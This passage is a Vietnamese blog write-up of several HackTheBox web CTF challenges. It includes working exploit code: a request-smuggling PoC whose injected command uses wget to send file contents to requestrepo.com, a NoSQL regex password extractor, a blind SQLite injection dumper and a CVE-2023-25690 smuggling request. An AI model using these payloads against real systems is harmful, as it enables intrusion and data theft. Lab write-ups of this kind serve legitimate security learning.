+	IPs, err := net.LookupIP(address)
+	if err != nil {
+		return false, err
+	}
+
+	for _, ip := range IPs {
+		if ip.IsLoopback() {
+			return true, nil
+		}
+	}
+
+	return false, nil
+}
+</code></pre><ul>
+<li>Kiểm tra body chứa các kí tự nguy hiểm:</li>
+</ul>
+<pre><code>func checkMaliciousBody(body string) (bool, error) {
+	patterns := []string{
+		&quot;[`;&amp;|]&quot;,
+		`\$\([^)]+\)`,
+		`(?i)(union)(.*)(select)`,
+		`&lt;script.*?&gt;.*?&lt;/script&gt;`,
+		`\r\n|\r|\n`,
+		`&lt;!DOCTYPE.*?\[.*?&lt;!ENTITY.*?&gt;.*?&gt;`,
+	}
+
+	for _, pattern := range patterns {
+		match, _ := regexp.MatchString(pattern, body)
+		if match {
+			return true, nil
+		}
+	}
+	return false, nil
+}
+</code></pre><ul>
+<li><code>backendConn, err := net.Dial(&quot;tcp&quot;, host)</code> thiết lập kết nối tcp đến host ở header.</li>
+<li>Ghi vào nội dung request:</li>
+</ul>
+<pre><code>_, err = backendConn.Write(requestBytes)
+</code></pre><p>-&gt; sau đó trả ra kết quả</p>
+<h3 id="bypass-ssrf-via-nipio-dns-binding">Bypass ssrf via nip.io DNS binding</h3>
+<ul>
+<li>
+<p>ở đây ta cần gửi request đến localhots 5000 của backend nodejs.</p>
+</li>
+<li>
+<p>Nip.io là một dịch vụ DNS tự động chuyển đổi địa chỉ IP thành tên miền phụ dựa trên định dạng nhất định. Ví dụ, nếu địa chỉ IP của máy chủ là 192.0.2.1, ta có thể truy cập vào máy chủ đó bằng cách sử dụng tên miền phụ &ldquo;192.0.2.1.nip.io&rdquo;.</p>
+</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/BJXRkg2LR.png" alt="image"></p>
+<ul>
+<li>
+<p>Ta có thể sử dụng:
+<img src="https://hackmd.io/_uploads/ryNreehIA.png" alt="image"></p>
+</li>
+<li>
+<p>Nhưng vẫn bị hàm <code>checkIfLocalhost</code> detect -&gt; để ý phần check server-status <code>/server-status</code></p>
+</li>
+</ul>
+<pre><code>if request.URL == string([]byte{47, 115, 101, 114, 118, 101, 114, 45, 115, 116, 97, 116, 117, 115}) {
+		var serverInfo string = GetServerInfo()
+		var responseText string = okResponse(serverInfo)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+</code></pre><ul>
+<li>ở đây sẽ trả ra serverInfo:</li>
+</ul>
+<pre><code>func GetServerInfo() string {
+	hostname, err := os.Hostname()
+	if err != nil {
+		hostname = &quot;unknown&quot;
+	}
+
+	addrs, err := net.InterfaceAddrs()
+	if err != nil {
+		addrs = []net.Addr{}
+	}
+
+	var ips []string
+	for _, addr := range addrs {
+		if ipNet, ok := addr.(*net.IPNet); ok &amp;&amp; !ipNet.IP.IsLoopback() {
+			if ipNet.IP.To4() != nil {
+				ips = append(ips, ipNet.IP.String())
+			}
+		}
+	}
+
+	ipList := strings.Join(ips, &quot;, &quot;)
+
+	info := fmt.Sprintf(&quot;Hostname: %s, Operating System: %s, Architecture: %s, CPU Count: %d, Go Version: %s, IPs: %s&quot;,
+		hostname, runtime.GOOS, runtime.GOARCH, runtime.NumCPU(), runtime.Version(), ipList)
+
+	return info
+}
+</code></pre><ul>
+<li>Ta sẽ nhận được hostname , Architecture, Operating System, IPs, Go Version.</li>
+</ul>
+<p>-&gt; nhận được ip của container <code>192.168.26.170</code>:</p>
+<p><img src="https://hackmd.io/_uploads/rkBcVl280.png" alt="image"></p>
+<ul>
+<li>
+<p>192.168.82.66 ở đây có vẻ chính là địa chị ip của phần backend xử lý được mở ở port 5000. Như đã phân tích từ đầu ta cần gọi các endpoint của Phần xử lý backend của NodeJS như /flushInterface để trigger RCE. Dó đó, ta có thể sử dụng ip này bypass qua blacklist check, thay vì sử dụng 192. ta hoàn toàn có thể sử dụng được 192- và điều này cũng được cho phép bởi nip.io dash notation: magic-127-0-0-1.nip.io</p>
+</li>
+<li>
+<p>Bypass thành công SSRF với nip.io:</p>
+</li>
+<li>
+<p>Mục tiêu của ta là truy cập đến endponit flushInterface của node server để trigger RCE.</p>
+</li>
+<li>
+<p>Khi truy cập thì nó bị detect có chuỗi này trong req nên không access đến được:</p>
+</li>
+</ul>
+<pre><code>if strings.Contains(strings.ToLower(request.URL), string([]byte{102, 108, 117, 115, 104, 105, 110, 116, 101, 114, 102, 97, 99, 101})) {
+		var responseText string = badReqResponse(&quot;Not Allowed&quot;)
+		frontendConn.Write([]byte(responseText))
+		frontendConn.Close()
+		return
+	}
+
+</code></pre><ul>
+<li>Như phần check ở trên ta hướng tới request smuggling</li>
+<li>Có thể thấy một điều kì lạ là nếu ta tiếp sử dụng <code>\r\n\r\n</code> để gửi request thứ hai (smuggling) và bằng cách cố định việc truyền Content-Length: 1 và phần body với length tương đương, lúc này request parser sẽ coi phần thân lúc này chỉ là byte đầu với length là 1, điều này có nghĩa là khi checkMaliciousBody kiểm tra nó sẽ chỉ xem xét duy nhất byte này mà không tiến hành check requests thứ hai.</li>
+</ul>
+<pre><code>l3mnt2010@ASUSEXPERTBOOK:~/HTB/medium/HTBProxy$ python3 index.py
+b'HTTP/1.1 401 Unauthorized\nX-Powered-By: Express\nContent-Type: application/json; charset=utf-8\nContent-Length: 37\nETag: W/&quot;25-+Jf7C2mDx/nvPFRCWncafprqHNs&quot;\nDate: Fri, 28 Jun 2024 09:49:43 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\n\n{&quot;message&quot;:&quot;Error getting addresses&quot;}HTTP/1.1 401 Unauthorized\nX-Powered-By: Express\nContent-Type: application/json; charset=utf-8\nContent-Length: 38\nETag: W/&quot;26-1CQv+OK4Js7XnYldCbe/Ju97dzY&quot;\nDate: Fri, 28 Jun 2024 09:49:43 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\n\n{&quot;message&quot;:&quot;Error flushing interface&quot;}\n'
+l3mnt2010@ASUSEXPERTBOOK:~/HTB/medium/HTBProxy$
+
+</code></pre><ul>
+<li>Như ta thấy thì ở đây ta có thể nhận được phản hồi của cả 2 endpoint.</li>
+<li>Bây giờ thì chỉ cần commandi để rce và nhận flag thôi</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/HJfqqb280.png" alt="image"></p>
+<pre><code>l3mnt2010@ASUSEXPERTBOOK:~/HTB/medium/HTBProxy$ python3 index.py
+b'HTTP/1.1 401 Unauthorized\nX-Powered-By: Express\nContent-Type: application/json; charset=utf-8\nContent-Length: 37\nETag: W/&quot;25-+Jf7C2mDx/nvPFRCWncafprqHNs&quot;\nDate: Fri, 28 Jun 2024 10:04:52 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\n\n{&quot;message&quot;:&quot;Error getting addresses&quot;}HTTP/1.1 401 Unauthorized\nX-Powered-By: Express\nContent-Type: application/json; charset=utf-8\nContent-Length: 38\nETag: W/&quot;26-1CQv+OK4Js7XnYldCbe/Ju97dzY&quot;\nDate: Fri, 28 Jun 2024 10:04:52 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\n\n{&quot;message&quot;:&quot;Error flushing interface&quot;}\n'
+l3mnt2010@ASUSEXPERTBOOK:~/HTB/medium/HTBProxy$
+
+</code></pre><p><img src="https://hackmd.io/_uploads/r18QjbnU0.png" alt="image"></p>
+<p>poc:</p>
+<pre><code># pip install pickora
+
+import socket
+from pickora import Compiler
+import base64
+from urllib.parse import quote_from_bytes
+
+compiler = Compiler(extended=True)
+
+HTTP_MSG = b&quot;POST /getAddresses HTTP/1.1\r\n&quot;
+HTTP_MSG+= b&quot;Host: magic-192-168-198-26.nip.io:5000\r\n&quot;
+HTTP_MSG+= b&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;
+HTTP_MSG+= b&quot;Content-Length: 1&quot; + b&quot;\r\n&quot;
+HTTP_MSG+= b&quot;\r\n&quot;
+HTTP_MSG+= b&quot;a&quot; + b&quot;\r\n&quot;
+HTTP_MSG+= b&quot;\r\n&quot;
+HTTP_MSG+= b&quot;POST /flushInterface HTTP/1.1\r\n&quot;
+HTTP_MSG+= b&quot;Host: localhost:5000\r\n&quot;
+HTTP_MSG+= b&quot;Content-Type: application/json\r\n&quot;
+HTTP_MSG+= b&quot;Content-Length: 79&quot; + b&quot;\r\n&quot;
+HTTP_MSG+= b&quot;\r\n&quot;
+HTTP_MSG+= b&quot;{\&quot;interface\&quot;:\&quot;;wget${IFS}http://requestrepo.com/0toin6os/?a=`cat${IFS}/*.txt`\&quot;}\r\n&quot;
+
+TARGET = (&quot;83.136.252.57&quot;, 47831)
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as ss:
+  ss.connect(TARGET)
+  ss.send(HTTP_MSG)
+  res = ss.recv(1024)
+  print(res)
+</code></pre><p>flag: <code>HTB{re3nv3nt1ng_th3_wh33l_suck5}</code></p>
+<p>tài liệu: <a href="https://nip.io/">https://nip.io/</a>
+wu tác giả: <a href="https://github.com/hackthebox/business-ctf-2024/tree/main/web/%5BEasy%5D%20HTB%20Proxy">https://github.com/hackthebox/business-ctf-2024/tree/main/web/%5BEasy%5D%20HTB%20Proxy</a></p>
+<h2 id="wild-goose-hunt">Wild Goose Hunt</h2>
+<ul>
+<li>Đổi gió với một chall nodejs cùng mongodb.</li>
+</ul>
+<pre><code>const express    = require('express');
+const app        = express();
+const bodyParser = require('body-parser');
+const routes     = require('./routes');
+const mongoose   = require('mongoose');
+
+mongoose.connect('mongodb://localhost:27017/heros', { useNewUrlParser: true , useUnifiedTopology: true });
+
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ 
+	extended: true 
+}));
+
+app.use(express.static('static'));
+app.set('view engine', 'pug');
+
+app.use(routes);
+
+app.all('*', (req, res) =&gt; {
+    return res.status(404).send({
+        message: '404 page not found'
+    });
+});
+
+app.listen(1337, () =&gt; console.log('Listening on port 1337'));
+</code></pre><ul>
+<li>
+<p>có thể thấy trang web có sử dụng template pugjs và chạy local trên port 1337.</p>
+</li>
+<li>
+<p>Các api chính của server:</p>
+</li>
+</ul>
+<pre><code>const express = require('express');
+const router  = express.Router();
+const User    = require('../models/User');
+
+router.get('/', (req, res) =&gt; {
+	return res.render('index');
+});
+
+router.post('/api/login', (req, res) =&gt; {
+	let { username, password } = req.body;
+
+	if (username &amp;&amp; password) {
+		return User.find({ 
+			username,
+			password
+		})
+			.then((user) =&gt; {
+				if (user.length == 1) {
+					return res.json({logged: 1, message: `Login Successful, welcome back ${user[0].username}.` });
+				} else {
+					return res.json({logged: 0, message: 'Login Failed'});
+				}
+			})
+			.catch(() =&gt; res.json({ message: 'Something went wrong'}) );
+	}
+	return res.json({ message: 'Invalid username or password'});
+});
+
+module.exports = router;
+</code></pre><ul>
+<li>
+<p>Có thể thấy ở đây có 2 endpoint đó là / và /api/login.</p>
+</li>
+<li>
+<p>Đi vào api/login.</p>
+</li>
+<li>
+<p>Có thể thấy server sẽ nhận username và password của người dùng sau đó tìm trong mongo xem có bản ghi nào không nếu có thì hiển thị với json là đăng nhập thành công + tên user.</p>
+</li>
+<li>
+<p>Và flag là mật khẩu của admin:</p>
+</li>
+</ul>
+<pre><code>#!/bin/bash
+
+# Secure entrypoint
+chmod 600 /entrypoint.sh
+mkdir /tmp/mongodb
+
+# Start mongodb
+mongod --noauth --dbpath /tmp/mongodb/ &amp;
+
+# Wait for mongodb
+until nc -z localhost 27017; do echo &quot;not up&quot; &amp;&amp; sleep 1; done
+
+# Populate mongodb
+mongosh heros --eval &quot;db.createCollection('users')&quot;
+mongosh heros --eval 'db.users.insert( { username: &quot;admin&quot;, password: &quot;HTB{f4k3_fl4g_f0r_t3st1ng}&quot;} )'
+
+# Run services
+/usr/bin/supervisord -c /etc/supervisord.conf
+
+</code></pre><ul>
+<li>Vậy bây giờ chỉ có hướng là nosqli để lấy pass của admin thôi.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/B1s-u7hLR.png" alt="image"></p>
+<ul>
+<li>Thử chuyển thành application/json thì vẫn nhận:</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/By0uumh8A.png" alt="image"></p>
+<ul>
+<li>Vậy thì khả năng cao sẽ là nosqli:</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/rkzpd73IR.png" alt="image"></p>
+<ul>
+<li>Thử một cái được luôn -&gt; vấn đề là làm sao để dumb được password của admin -&gt; DÙNG regex để check password của admin:</li>
+</ul>
+<pre><code>import requests
+import string
+import json
+url = &quot;http://94.237.59.63:45903/api/login&quot;
+headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}
+possible_chars = list(string.ascii_letters) + list(string.digits) + [&quot;\\&quot;+c for c in string.punctuation+string.whitespace ]
+def get_password(username):
+    print(&quot;Extracting password of &quot;+username)
+    password = &quot;HTB{&quot;
+    while True:
+        for c in possible_chars:
+            payload = {&quot;username&quot;: &quot;admin&quot;,&quot;password&quot;:  {&quot;$regex&quot;:password+c+ &quot;.*&quot; }}
+            pr = requests.post(url ,data=json.dumps(payload), headers=headers)
+            if &quot;admin&quot; in pr.text:
+                password += c
+                print(password)
+                break
+    if c == possible_chars[-1]:
+        print(&quot;Found password &quot;+password[0:].replace(&quot;\\&quot;, &quot;&quot;)+&quot; for username &quot;+username)
+get_password(&quot;admin&quot;)
+</code></pre><p><img src="https://hackmd.io/_uploads/Skpr07hIA.png" alt="image"></p>
+<p>flag : <code>HTB{th3_4l13ns_h4v3nt_us3d_m0ng0db_I_gu3ss!}</code></p>
+<h2 id="emoji-voting">emoji voting</h2>
+<ul>
+<li>Tiếp tục một chall với nodejs:</li>
+</ul>
+<pre><code>
+const express       = require('express');
+const app           = express();
+const bodyParser    = require('body-parser');
+const routes        = require('./routes');
+const path          = require('path');
+const Database      = require('./database');
+
+const db = new Database('emoji-voting.db');
+
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({
+    extended: true
+}));
+app.set('views', './views');
+app.use('/static', express.static(path.resolve('static')));
+
+app.use(routes(db));
+
+app.all('*', (req, res) =&gt; {
+    return res.status(404).send({
+        message: '404 page not found'
+    });
+});
+
+(async () =&gt; {
+    await db.connect();
+    await db.migrate();
+
+    app.listen(1337, () =&gt; console.log('Listening on port 1337'));
+})();
+
+</code></pre><ul>
+<li>Sử dụng db:</li>
+</ul>
+<pre><code>const sqlite = require('sqlite-async');
+const crypto = require('crypto');
+
+class Database {
+    constructor(db_file) {
+        this.db_file = db_file;
+        this.db = undefined;
+    }
+    
+    async connect() {
+        this.db = await sqlite.open(this.db_file);
+    }
+
+    async migrate() {
+        let rand = crypto.randomBytes(5).toString('hex');
+
+        return this.db.exec(`
+            DROP TABLE IF EXISTS emojis;
+            DROP TABLE IF EXISTS flag_${ rand };
+
+            CREATE TABLE IF NOT EXISTS flag_${ rand } (
+                flag TEXT NOT NULL
+            );
+
+            INSERT INTO flag_${ rand } (flag) VALUES ('HTB{f4k3_fl4g_f0r_t3st1ng}');
+
+            CREATE TABLE IF NOT EXISTS emojis (
+                id      INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
+                emoji   VARCHAR(255),
+                name    VARCHAR(255),
+                count   INTEGERT
+            );
+
+            INSERT INTO emojis (emoji, name, count) VALUES 
+                ('👽', 'alien', 13),
+                ('🛸', 'flying saucer', 3),
+                ('👾', 'alien monster', 0),
+                ('💩', '👇 = human', 118),
+                ('🚽', '👇 = human', 19),
+                ('🪠', '👇 = human', 2),
+                ('🍆', 'eggplant', 69),
+                ('🍑', 'peach', 40),
+                ('🍌', 'banana', 21),
+                ('🐶', 'dog', 80),
+                ('🐷', 'pig', 37),
+                ('👨', 'homo idiotus', 124)
+        `);
+    }
+
+    async vote(id) {
+        return new Promise(async (resolve, reject) =&gt; {
+            try {
+                let query = 'UPDATE emojis SET count = count + 1 WHERE id = ?';
+                resolve(await this.db.run(query, [id]));
+            } catch(e) {
+                reject(e);
+            }
+        });
+    }
+
+    async getEmojis(order) {
+        // TOOD: add parametrization
+        return new Promise(async (resolve, reject) =&gt; {
+            try {
+                let query = `SELECT * FROM emojis ORDER BY ${ order }`;
+                resolve(await this.db.all(query));
+            } catch(e) {
+                reject(e);
+            }
+        });
+    }
+}
+
+module.exports = Database;
+
+</code></pre><ul>
+<li>ở đây ta có thể thấy có một class <code>Database</code> khởi tạo với .db và có các method như trên.</li>
+<li>Và để ý method:</li>
+</ul>
+<pre><code>async migrate() {
+        let rand = crypto.randomBytes(5).toString('hex');
+
+        return this.db.exec(`
+            DROP TABLE IF EXISTS emojis;
+            DROP TABLE IF EXISTS flag_${ rand };
+
+            CREATE TABLE IF NOT EXISTS flag_${ rand } (
+                flag TEXT NOT NULL
+            );
+
+            INSERT INTO flag_${ rand } (flag) VALUES ('HTB{f4k3_fl4g_f0r_t3st1ng}');
+
+            CREATE TABLE IF NOT EXISTS emojis (
+                id      INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
+                emoji   VARCHAR(255),
+                name    VARCHAR(255),
+                count   INTEGERT
+            );
+
+            INSERT INTO emojis (emoji, name, count) VALUES 
+                ('👽', 'alien', 13),
+                ('🛸', 'flying saucer', 3),
+                ('👾', 'alien monster', 0),
+                ('💩', '👇 = human', 118),
+                ('🚽', '👇 = human', 19),
+                ('🪠', '👇 = human', 2),
+                ('🍆', 'eggplant', 69),
+                ('🍑', 'peach', 40),
+                ('🍌', 'banana', 21),
+                ('🐶', 'dog', 80),
+                ('🐷', 'pig', 37),
+                ('👨', 'homo idiotus', 124)
+        `);
+    }
+</code></pre><ul>
+<li>Đây là nơi flag được chèn vào bảng flag_* với tên bảng flag được random đuôi.</li>
+<li>giờ thì xem các api của challenge:</li>
+</ul>
+<pre><code>const path      = require('path');
+const express   = require('express');
+const router    = express.Router();
+
+let db;
+
+const response = data =&gt; ({ message: data });
+
+router.get('/', (req, res) =&gt; {
+	return res.sendFile(path.resolve('views/index.html'));
+});
+
+router.post('/api/vote', (req, res) =&gt; {
+	let { id } = req.body;
+
+	if (id) {
+		return db.vote(id)
+			.then(() =&gt; {
+				return res.send(response('Successfully voted')) ;
+			})
+			.catch((e) =&gt; {
+				return res.send(response('Something went wrong'));
+			})
+	}
+
+	return res.send(response('Missing parameters'));
+})
+
+router.post('/api/list', (req, res) =&gt; {
+	let { order } = req.body;
+
+	if (order) {
+		return db.getEmojis(order)
+			.then(data =&gt; {
+				if (data) {
+					return res.json(data);
+				}
+
+				return res.send(response('Seems like there are no emojis'));
+			})
+			.catch((e) =&gt; {
+				return res.send(response('Something went wrong'));
+			})
+	}
+
+	return res.send(response('Missing parameters'))
+});	
+
+module.exports = database =&gt; { 
+	db = database;
+	return router;
+};
+</code></pre><ul>
+<li>route / để hiển thị trang index.html</li>
+<li>route /api/vote -&gt; nhận id sau đó gọi method vote(id):</li>
+</ul>
+<pre><code>
+async vote(id) {
+        return new Promise(async (resolve, reject) =&gt; {
+            try {
+                let query = 'UPDATE emojis SET count = count + 1 WHERE id = ?';
+                resolve(await this.db.run(query, [id]));
+            } catch(e) {
+                reject(e);
+            }
+        });
+    }
+</code></pre><ul>
+<li>
+<p>Nó sẽ update bảng emojis và set giá trị của count tăng lên 1 với id được truyền vào thì đây là logic đơn giản của chức năng vote.</p>
+</li>
+<li>
+<p>Route /api/list sẽ nhận giá trị order -&gt; gọi method <code>getEmojis(order)</code>:</p>
+</li>
+</ul>
+<pre><code>async getEmojis(order) {
+        // TOOD: add parametrization
+        return new Promise(async (resolve, reject) =&gt; {
+            try {
+                let query = `SELECT * FROM emojis ORDER BY ${ order }`;
+                resolve(await this.db.all(query));
+            } catch(e) {
+                reject(e);
+            }
+        });
+    }
+</code></pre><ul>
+<li>Lấy tất cả các bản ghi từ emojis sắp xếp theo order -&gt; như ta có thể thấy là ở đây bị dính sqli -&gt; có thể dumb được db.</li>
+<li>Lưu ý là migrate đã được gọi rồi nên flag đã được insert vào bảng flag:</li>
+</ul>
+<pre><code>(async () =&gt; {
+    await db.connect();
+    await db.migrate();
+
+    app.listen(1337, () =&gt; console.log('Listening on port 1337'));
+})();
+
+</code></pre><ul>
+<li>Db sử dụng là sqlite</li>
+</ul>
+<h3 id="exploit-3">exploit</h3>
+<p><img src="https://hackmd.io/_uploads/SJSuVE280.png" alt="image"></p>
+<p>poc:</p>
+<pre><code>import requests, time
+
+
+def send_payload(url, sqli):
+    _headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0&quot;,
+                &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;,
+                &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;,
+                &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Cache-Control&quot;: &quot;max-age=0&quot;,
+                &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
+    _data = {&quot;order&quot;: sqli}
+    resp = requests.post(url, headers=_headers, data=_data).text
+    if 'alien' in resp:
+        return True
+    else:
+        return False
+
+
+def sqli():
+    url = &quot;http://94.237.51.179:45595/api/list&quot;
+
+    sqli_temp = '1 limit _LEFT_ = _RIGHT_'
+
+    left = '(select length(name) from sqlite_master where name like \'flag%\')'
+
+    for i in range(1, 21):
+
+        sqli = sqli_temp.replace('_LEFT_', left)
+        sqli = sqli.replace('_RIGHT_', str(i))
+
+        print(i, end='\r')
+
+        res = send_payload(url, sqli)
+
+        if res:
+            dataLength = i
+            break
+
+    print(&quot;\n\n[+] Found tablename length: %s\n&quot; % dataLength)
+
+    flag_table = 'flag_'
+
+    # extract flag table name
+
+    for charPos in range(6, dataLength + 1):
+
+        left = '(select unicode(substr(name,_POS_,1)) from sqlite_master where name like \'flag%\')'.replace('_POS_',
+                                                                                                             str(charPos))
+
+        for char in range(32, 127):
+            sqli = sqli_temp.replace('_LEFT_', left)
+            sqli = sqli.replace('_RIGHT_', str(char))
+
+            res = send_payload(url, sqli)
+
+            if res:
+                flag_table = flag_table + chr(char)
+                print(flag_table, end='\r')
+                break
+
+    print(&quot;\n\n[+] Extracted flag tablename: %s\n&quot; % flag_table)
+
+    # get length of flag content
+    left = '(select length(flag) from %s)' % flag_table
+
+    for i in range(1, 70):
+
+        sqli = sqli_temp.replace('_LEFT_', left)
+        sqli = sqli.replace('_RIGHT_', str(i))
+
+        print(i, end='\r')
+
+        res = send_payload(url, sqli)
+
+        if res:
+            flagDataLength = i
+            break
+
+    print(&quot;\n\n[+] Found flag data length: %s\n&quot; % flagDataLength)
+
+    flag_data = ''
+
+    for charPos in range(1, flagDataLength + 1):
+
+        left = '(select unicode(substr(flag,%d,1)) from %s)' % (charPos, flag_table)
+
+        for char in range(32, 127):
+            sqli = sqli_temp.replace('_LEFT_', left)
+            sqli = sqli.replace('_RIGHT_', str(char))
+            res = send_payload(url, sqli)
+
+            if res:
+                flag_data = flag_data + chr(char)
+                print(flag_data, end='\r')
+                break
+
+    print(&quot;\n\n[+] Extracted flag data: %s\n&quot; % flag_data)
+
+
+def main():
+    sqli()
+
+
+if __name__ == '__main__':
+    main()
+
+</code></pre><h2 id="apacheblaze">ApacheBlaze</h2>
+<ul>
+<li>Một chall với be là flask + fe là html + js thuần.</li>
+</ul>
+<h3 id="backend">Backend</h3>
+<pre><code>from flask import Flask, request, jsonify
+
+app = Flask(__name__)
+
+app.config['GAMES'] = {'magic_click', 'click_mania', 'hyper_clicker', 'click_topia'}
+app.config['FLAG'] = 'HTB{f4k3_fl4g_f0r_t3st1ng}'
+
+@app.route('/', methods=['GET'])
+def index():
+    game = request.args.get('game')
+
+    if not game:
+        return jsonify({
+            'error': 'Empty game name is not supported!.'
+        }), 400
+
+    elif game not in app.config['GAMES']:
+        return jsonify({
+            'error': 'Invalid game name!'
+        }), 400
+
+    elif game == 'click_topia':
+        if request.headers.get('X-Forwarded-Host') == 'dev.apacheblaze.local':
+            return jsonify({
+                'message': f'{app.config[&quot;FLAG&quot;]}'
+            }), 200
+        else:
+            return jsonify({
+                'message': 'This game is currently available only from dev.apacheblaze.local.'
+            }), 200
+
+    else:
+        return jsonify({
+            'message': 'This game is currently unavailable due to internal maintenance.'
+        }), 200
+
+</code></pre><ul>
+<li>đầu tiên server sẽ cofig giá trị &ldquo;GAMES&rdquo; với các giá trị chuỗi -&gt; flag nằm ở config &ldquo;FLAG&rdquo;</li>
+<li>Server chỉ có một route duy nhất là get <code>/</code> -&gt; nhận một param <code>game</code> -&gt; và yêu cầu game phải nằm trong dãy <code>{'magic_click', 'click_mania', 'hyper_clicker', 'click_topia'}</code></li>
+</ul>
+<pre><code>elif game == 'click_topia':
+        if request.headers.get('X-Forwarded-Host') == 'dev.apacheblaze.local':
+            return jsonify({
+                'message': f'{app.config[&quot;FLAG&quot;]}'
+            }), 200
+        else:
+            return jsonify({
+                'message': 'This game is currently available only from dev.apacheblaze.local.'
+            }), 200
+</code></pre><ul>
+<li>Nếu game là <code>click_topia</code> -&gt; check X-Forwarded-Host là <code>dev.apacheblaze.local</code> thì nhận được FLAG.</li>
+</ul>
+<h3 id="exploit-cve-2023-25690-http-request-smuggling">Exploit CVE-2023-25690 HTTP Request Smuggling</h3>
+<p><img src="https://hackmd.io/_uploads/SJx2B4RwA.png" alt="image"></p>
+<pre><code>GET /api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/api/games/click_topia HTTP/1.1
+Host: 94.237.59.63:34746
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+X-Requested-With: XMLHttpRequest
+Connection: close
+Referer: http://94.237.59.63:34746/
+Priority: u=0
+</code></pre><p><img src="https://hackmd.io/_uploads/HylAjE8zdA.png" alt="image"></p>
+<h3 id="explain">Explain</h3>
+<ul>
+<li>Quan sát phần config httpd.conf:</li>
+</ul>
+<pre><code>&lt;VirtualHost *:1337&gt;
+
+    ServerName _
+
+    DocumentRoot /usr/local/apache2/htdocs
+
+    RewriteEngine on
+
+    RewriteRule &quot;^/api/games/(.*)&quot; &quot;http://127.0.0.1:8080/?game=$1&quot; [P]
+    ProxyPassReverse &quot;/&quot; &quot;http://127.0.0.1:8080:/api/games/&quot;
+
+&lt;/VirtualHost&gt;
+</code></pre><ul>
+<li>Trong docker ta có thấy server sử dụng bản <code>RUN wget https://archive.apache.org/dist/httpd/httpd-2.4.55.tar.gz &amp;&amp; tar -xvf httpd-2.4.55.tar.gz</code> searching ta cũng thấy dính CVE trên</li>
+</ul>
+<p>poc: <a href="https://github.com/dhmosfunk/CVE-2023-25690-POC?tab=readme-ov-file#advisory-description">https://github.com/dhmosfunk/CVE-2023-25690-POC?tab=readme-ov-file#advisory-description</a>
+<a href="https://whitehat.vn/threads/xuat-hien-poc-cho-lo-hong-nghiem-trong-trong-may-chu-apache-http.17263/">https://whitehat.vn/threads/xuat-hien-poc-cho-lo-hong-nghiem-trong-trong-may-chu-apache-http.17263/</a></p>
+<p>flag: <code>HTB{1t5_4ll_4b0ut_Th3_Cl1ck5}</code></p>
+<h2 id="renderquest">RenderQuest</h2>
+<p><img src="https://hackmd.io/_uploads/H1ispLzOC.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/S1inpLf_C.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/Hk9gCLG_0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/rkeaGRLGd0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/r1lmRLGuC.png" alt="image"></p>
+<p>flag : <code>HTB{qu35t_f0r_th3_f0rb1dd3n_t3mpl4t35!!}</code></p>
+
+
+        
+          <div class="blog-tags">
+            
+              
+              <a href="https://bzoltan1.github.io/tags/ctf/">CTF</a>&nbsp;
+            
+              
+              <a href="https://bzoltan1.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
+            
+          </div>
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://bzoltan1.github.io/write-up/2024-08-22-hackthebox-web-challpart3/" data-toggle="tooltip" data-placement="top" title="Htb web chall ctf 2024 - solved challenges - part 3">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://bzoltan1.github.io/write-up/2024-08-20-hackthebox-web-challpart1/" data-toggle="tooltip" data-placement="top" title="Htb web chall ctf 2024 - solved challenges - part 1">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+      <footer>
+  <div class="container">
+    
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            0001
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
